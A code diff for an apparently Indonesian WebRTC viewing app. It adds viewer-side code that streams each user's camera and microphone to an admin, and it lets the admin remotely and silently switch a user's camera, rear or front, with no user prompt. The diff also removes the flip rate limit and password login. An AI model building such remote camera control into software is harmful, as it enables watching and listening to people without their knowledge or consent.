-  const grid = document.getElementById('admin-session-grid');
-  if (!grid.querySelector('.session-card')) {
-    grid.innerHTML = `
-      <div class="empty-state" style="grid-column:1/-1;">
-        <div class="es-icon">📡</div>
-        <div>Belum ada sesi aktif saat ini.<br>Video & audio muncul otomatis saat ada pengguna yang menonton.</div>
-      </div>`;
-  }
-
-  document.getElementById('admin-stat-active').textContent =
-    document.querySelectorAll('.session-card').length;
+  adminPeers.set(sessionId, { pc, videoEl, user });
 }
 
+function animateAudioMeter(sessionId) {
+  const meter = adminAudioMeters.get(sessionId);
+  if (!meter) return;
 
-// ================================================================
-// ADMIN — FLIP KAMERA & PERBESAR LAYAR PENGGUNA
-// ================================================================
-const flipCooldowns = new Map(); // sessionId → timestamp terakhir request
+  const el = document.getElementById(`meter-${sessionId}`);
+  if (!el) return;
+
+  const data = new Uint8Array(meter.analyser.frequencyBinCount);
+  const animate = () => {
+    meter.analyser.getByteFrequencyData(data);
+    const avg = Array.from(data).reduce((a, b) => a + b) / data.length;
+    const level = Math.min(100, (avg / 255) * 150);
+    el.style.width = level + '%';
+    if (adminAudioMeters.has(sessionId)) {
+      requestAnimationFrame(animate);
+    }
+  };
+  animate();
+}
 
 function flipCameraRequest(sessionId) {
   if (!sessionId) return;
-  if (!socket?.connected) {
-    alert('Koneksi signaling belum aktif, coba lagi sebentar.');
-    return;
-  }
-
-  // Cooldown 3 detik per sesi agar tidak spam
-  const lastFlip = flipCooldowns.get(sessionId) || 0;
-  if (Date.now() - lastFlip < 3000) {
-    addAdminLog('Admin', `Flip kamera ${sessionId} masih cooldown, tunggu sebentar`, '#F2A93B');
-    return;
-  }
-  flipCooldowns.set(sessionId, Date.now());
-
   socket.emit('flip-camera', { sessionId });
-  addAdminLog('Admin', `meminta ganti kamera untuk sesi ${sessionId}`, '#A855F7');
-
-  // Disable tombol sementara
-  const btn = document.querySelector(`#card-${sessionId} .sc-ctrl-btn[title="Flip kamera pengguna"]`);
-  if (btn) {
-    btn.disabled = true;
-    btn.style.opacity = '0.5';
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.style.opacity = '';
-    }, 3000);
-  }
 }
 
 function expandSession(sessionId) {
-  const videoEl = document.getElementById(`admin-video-${sessionId}`);
+  const videoEl = adminPeers.get(sessionId)?.videoEl;
   if (!videoEl || !videoEl.srcObject) {
     alert('Video belum tersedia untuk sesi ini.');
     return;
@@ -896,11 +437,10 @@ function expandSession(sessionId) {
   const card     = document.getElementById(`card-${sessionId}`);
   const nameEl   = card?.querySelector('.sc-name');
   const avatarEl = card?.querySelector('.sc-avatar');
-  const emailEl  = card?.querySelector('.audio-meter-label small');
 
   document.getElementById('vm-name').textContent   = nameEl?.textContent   || 'Pengguna';
   document.getElementById('vm-avatar').textContent = avatarEl?.textContent || 'U';
-  document.getElementById('vm-email').textContent  = emailEl?.textContent  || '';
+  document.getElementById('vm-email').textContent  = '—';
 
   const vmVideo = document.getElementById('vm-video');
   vmVideo.srcObject = videoEl.srcObject;
@@ -1055,6 +595,96 @@ async function stopSession(showEnded = true) {
 
 
 // ================================================================
+// WEBRTC — VIEWER SIDE
+// ================================================================
+function connectSocket_Viewer() {
+  socket = io(API_BASE, {
+    auth: { token: authToken },
+    reconnection: true,
+    reconnectionDelay: 1000,
+    reconnectionDelayMax: 5000
+  });
+
+  socket.on('connect', () => {
+    console.log('[Viewer] Terhubung ke server');
+    socket.emit('register-viewer', { sessionId: mySessionId });
+  });
+
+  socket.on('offer', async (msg) => {
+    try {
+      const pc = new RTCPeerConnection({ iceServers: TURN_SERVERS });
+      viewerPeers.set(msg.sessionId, pc);
+
+      pc.addTrack(camStream.getVideoTracks()[0], camStream);
+      if (camStream.getAudioTracks().length > 0) {
+        pc.addTrack(camStream.getAudioTracks()[0], camStream);
+      }
+
+      pc.onicecandidate = (evt) => {
+        if (evt.candidate) {
+          socket.emit('ice-candidate', {
+            sessionId: msg.sessionId,
+            data: evt.candidate.toJSON()
+          });
+        }
+      };
+
+      await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      socket.emit('answer', { sessionId: msg.sessionId, data: answer });
+    } catch (e) {
+      console.error('Viewer offer error:', e);
+    }
+  });
+
+  socket.on('ice-candidate', (msg) => {
+    if (msg.from !== 'admin') return;
+    const pc = viewerPeers.get(msg.sessionId);
+    if (pc && msg.data) {
+      pc.addIceCandidate(new RTCIceCandidate(msg.data))
+        .catch(e => console.error('addIceCandidate error:', e));
+    }
+  });
+
+  socket.on('flip-camera', async () => {
+    try {
+      const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+      const newStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: nextFacingMode },
+        audio: true
+      });
+      currentFacingMode = nextFacingMode;
+      const oldTrack = camStream.getVideoTracks()[0];
+      const newTrack = newStream.getVideoTracks()[0];
+      camStream.removeTrack(oldTrack);
+      camStream.addTrack(newTrack);
+      oldTrack.stop();
+
+      for (const pc of viewerPeers.values()) {
+        const sender = pc.getSenders().find(s => s.track?.kind === 'video');
+        if (sender) await sender.replaceTrack(newTrack);
+      }
+
+      socket.emit('flip-camera-accepted', { sessionId: mySessionId });
+      addAdminLog(currentUser?.name || 'Pengguna', 'membalik kamera', '#4ADE80');
+    } catch (e) {
+      console.error('Flip camera error:', e);
+      socket.emit('flip-camera-rejected', { sessionId: mySessionId });
+    }
+  });
+
+  socket.on('disconnect', () => {
+    console.log('[Viewer] Terputus dari server');
+  });
+
+  socket.on('connect_error', (err) => {
+    console.error('Socket error:', err);
+  });
+}
+
+
+// ================================================================
 // ADMIN LOG
 // ================================================================
 function addAdminLog(user, action, color = '#5B8CFF') {
@@ -1088,21 +718,20 @@ window.addEventListener('DOMContentLoaded', () => {
     if (e.key === 'Escape' && currentExpandedSession) closeExpandSession();
   });
 
-  ['login-email', 'login-pass'].forEach(id => {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.addEventListener('keydown', e => {
+  const nameEl = document.getElementById('login-name');
+  if (nameEl) {
+    nameEl.addEventListener('keydown', e => {
       if (e.key === 'Enter') {
         e.preventDefault();
         const btn = document.getElementById('btn-login');
         if (!btn.disabled) doLogin();
       }
     });
-    el.addEventListener('input', () => {
-      el.classList.remove('input-error');
+    nameEl.addEventListener('input', () => {
+      nameEl.classList.remove('input-error');
       document.getElementById('login-error').classList.remove('show');
     });
-  });
+  }
 });
 
 window.addEventListener('beforeunload', () => {
